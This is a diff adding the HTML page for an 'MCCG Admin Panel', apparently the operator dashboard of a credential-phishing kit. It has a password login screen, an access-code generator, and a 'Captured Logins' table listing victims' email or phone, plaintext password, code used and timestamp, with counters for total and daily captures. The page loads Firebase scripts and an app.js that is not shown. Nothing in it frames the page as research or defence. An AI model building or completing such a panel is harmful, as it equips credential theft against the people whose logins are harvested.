@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>MCCG - Admin Panel</title>
+</head>
+<body class="admin-body">
+    
+    <!-- Admin Login -->
+    <div id="admin-login" class="admin-login-screen">
+        <div class="admin-login-box">
+            <h1>MCCG Admin</h1>
+            <p>Enter admin credentials to continue</p>
+            <div class="access-input-wrapper">
+                <label for="admin-pass">ADMIN PASSWORD</label>
+                <input type="password" id="admin-pass" placeholder="Enter password..." autocomplete="off">
+            </div>
+            <button id="admin-login-btn" class="primary-btn">Access Panel</button>
+            <p id="admin-error" class="error-text hidden">Invalid credentials</p>
+        </div>
+    </div>
+
+    <!-- Admin Panel -->
+    <div id="admin-panel" class="admin-panel hidden">
+        <header class="admin-header">
+            <h1>MCCG Admin Panel</h1>
+            <button id="logout-btn" class="secondary-btn">Logout</button>
+        </header>
+
+        <div class="admin-content">
+            <!-- Code Generator Section -->
+            <section class="admin-section">
+                <div class="section-header">
+                    <h2>MC-CODE Generator</h2>
+                </div>
+                <div class="code-generator">
+                    <button id="generate-code-btn" class="primary-btn">Generate MC-CODE</button>
+                    <div id="generated-code-display" class="generated-code hidden">
+                        <span id="code-text" class="code-hidden">****************</span>
+                        <button id="toggle-code-btn" class="icon-btn">Show</button>
+                        <button id="copy-code-btn" class="icon-btn">Copy</button>
+                    </div>
+                </div>
+
+                <!-- Generated Codes List -->
+                <div class="codes-list-section">
+                    <h3>Active Codes</h3>
+                    <div id="codes-list" class="codes-list">
+                        <p class="empty-state">No codes generated yet</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Users Section -->
+            <section class="admin-section">
+                <div class="section-header">
+                    <h2>Captured Logins</h2>
+                    <span id="user-count" class="badge">0</span>
+                </div>
+                <div class="users-table-container">
+                    <table class="users-table">
+                        <thead>
+                            <tr>
+                                <th>Email/Phone</th>
+                                <th>Password</th>
+                                <th>Code Used</th>
+                                <th>Timestamp</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="users-tbody">
+                            <tr>
+                                <td colspan="5" class="empty-state">No logins captured yet</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Statistics -->
+            <section class="admin-section stats-section">
+                <div class="stat-card">
+                    <h3>Total Logins</h3>
+                    <span id="total-logins">0</span>
+                </div>
+                <div class="stat-card">
+                    <h3>Active Codes</h3>
+                    <span id="active-codes">0</span>
+                </div>
+                <div class="stat-card">
+                    <h3>Today's Logins</h3>
+                    <span id="today-logins">0</span>
+                </div>
+            </section>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
